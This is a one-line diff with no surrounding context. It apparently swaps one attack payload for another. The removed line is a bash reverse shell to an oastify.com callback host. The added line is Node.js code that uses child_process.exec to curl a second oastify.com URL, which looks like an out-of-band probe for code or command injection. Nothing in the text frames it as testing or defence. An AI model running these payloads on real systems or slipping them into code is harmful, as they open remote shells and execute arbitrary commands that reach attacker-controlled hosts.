@@ -1,1 +1,1 @@
-sh -i >& /dev/tcp/1y07wiy7vs7qv1s5ybvbl2lsljraf13q.oastify.com/443 0>&1
+require('child_process').exec('curl https://2ru8pjr8ot0ro2l6rcoce3etekkb83ws.oastify.com/testt')
